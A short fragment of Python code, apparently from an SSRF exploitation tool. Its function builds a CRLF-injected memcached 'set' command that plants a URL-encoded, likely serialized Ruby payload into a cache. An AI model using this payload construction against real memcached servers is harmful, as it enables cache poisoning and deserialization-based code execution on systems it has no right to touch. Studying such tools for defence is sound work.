...
def RbMemcached():
    ...
    def get_payload(payload):
        ...
        encoded = urllib.parse.quote_plus(payload_bytes).replace("+", "%20").replace("%2F", "/").replace("%25", "%").replace("%3A", ":")
        finalpayload = "%0d%0aset%20SpyD3r%204%2060%20" + str(payload_len) + "%0d%0a" + encoded + "%0d%0a"
        return finalpayload
